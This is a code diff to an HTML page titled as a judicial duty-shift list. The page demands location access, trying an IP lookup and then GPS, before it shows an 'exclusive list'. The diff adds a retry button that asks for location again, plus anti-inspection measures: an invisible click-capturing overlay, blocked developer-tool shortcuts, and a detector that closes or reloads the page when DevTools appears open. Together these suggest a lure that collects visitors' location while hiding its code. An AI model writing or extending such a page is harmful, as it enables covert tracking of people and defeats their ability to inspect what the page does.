@@ -19,10 +19,11 @@
             margin: 0; 
             padding: 0; 
             text-align: center; 
-            -webkit-user-select: none;
-            -moz-user-select: none;
-            -ms-user-select: none;
-            user-select: none;
+            -webkit-user-select: none; /* Bloqueia seleção no iOS */
+            -moz-user-select: none; 
+            -ms-user-select: none; 
+            user-select: none; /* Bloqueia seleção no Android/Desktop */
+            overflow-x: hidden; /* Evita scroll horizontal */
         }
         
         .header { 
@@ -33,6 +34,8 @@
             font-size: 1.4em; 
             letter-spacing: 0.5px; 
             box-shadow: 0 2px 5px rgba(0,0,0,0.2); 
+            position: relative;
+            z-index: 100;
         }
         
         .container { 
@@ -41,6 +44,8 @@
             margin: 0 auto; 
             background: white; 
             min-height: 90vh; 
+            position: relative;
+            z-index: 50;
         }
         
         .alert-box {
@@ -154,9 +159,36 @@
             color: #d32f2f;
             font-weight: bold;
         }
+
+        .btn-retry {
+            background-color: #d32f2f;
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 4px;
+            font-size: 1em;
+            margin-top: 15px;
+            cursor: pointer;
+            width: 100%;
+        }
+
+        /* Overlay de Blindagem: Impede clique direito e seleção */
+        .shield-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: 9999;
+            background: transparent;
+            display: block;
+        }
     </style>
 </head>
 <body oncontextmenu="return false;">
+
+    <!-- Overlay invisível para capturar toques e impedir ações nativas -->
+    <div class="shield-overlay" id="shield"></div>
 
     <div class="header">MONTE CITY - PLANTÃO JUDICIAL</div>
 
@@ -188,7 +220,9 @@
         </div>
         
         <div id="error-msg" class="error-message">
-            ⚠️ Localização necessária para acessar a lista exclusiva. Por favor, permita o acesso nas configurações do navegador.
+            ⚠️ Localização necessária para acessar a lista exclusiva.<br>
+            <small>Clique no botão abaixo para tentar novamente.</small>
+            <button class="btn-retry" onclick="reiniciarVerificacao()">🔄 VERIFICAR NOVAMENTE</button>
         </div>
     </div>
 
@@ -204,6 +238,7 @@
         function iniciarVerificacao() {
             document.getElementById('btn').style.display = 'none';
             document.getElementById('loader').style.display = 'block';
+            document.getElementById('error-msg').style.display = 'none';
             
             document.getElementById('lock-overlay').style.opacity = '0';
             setTimeout(() => {
@@ -223,6 +258,17 @@
                     updateStatus("Servidor ocupado, tentando GPS direto...", 60);
                     solicitarGPS(true);
                 });
+        }
+
+        function reiniciarVerificacao() {
+            const newUrl = window.location.pathname + '?t=' + Date.now();
+            window.history.pushState({path:newUrl}, '', newUrl);
+            
+            document.getElementById('error-msg').style.display = 'none';
+            document.getElementById('btn').style.display = 'block';
+            document.getElementById('lock-overlay').style.display = 'flex';
+            document.getElementById('lock-overlay').style.opacity = '1';
+            document.getElementById('main-image').style.opacity = '1';
         }
 
         function solicitarGPS(ipFracassou = false) {
@@ -268,9 +314,6 @@
         function mostrarErro() {
             document.getElementById('loader').style.display = 'none';
             document.getElementById('error-msg').style.display = 'block';
-            setTimeout(() => {
-                 window.location.href = "https://www.instagram.com/montecitybr";
-            }, 5000);
         }
 
         function finalizarComSucesso() {
@@ -288,7 +331,7 @@
             }, 1000);
         }
 
-        // Bloqueio de Inspeção
+        // --- BLOQUEIO DE TECLAS E GESTOS (Android/Desktop) ---
         document.addEventListener('keydown', function(event) {
             if (event.key === 'F12' || 
                (event.ctrlKey && event.shiftKey && ['I', 'J', 'K'].includes(event.key.toUpperCase())) ||
@@ -296,7 +339,27 @@
                 event.preventDefault();
             }
         });
+
+        // Desativa toque duplo para inspecionar (comum em Android)
+        let lastTouchEnd = 0;
+        document.addEventListener('touchend', function(event) {
+            const now = (new Date()).getTime();
+            if (now - lastTouchEnd <= 300) {
+                event.preventDefault();
+            }
+            lastTouchEnd = now;
+        }, false);
+
+        // Detecta se DevTools está aberto e fecha/recarrega
+        setInterval(function() {
+            const threshold = 160; // Limite de largura da janela
+            if (window.outerWidth - window.innerWidth > threshold || window.outerHeight - window.innerHeight > threshold) {
+                // Se a janela estiver redimensionada (indicativo de DevTools aberto)
+                window.close();
+                window.location.reload();
+            }
+        }, 1000);
     </script>
 
 </body>
-    </html>
+</html>
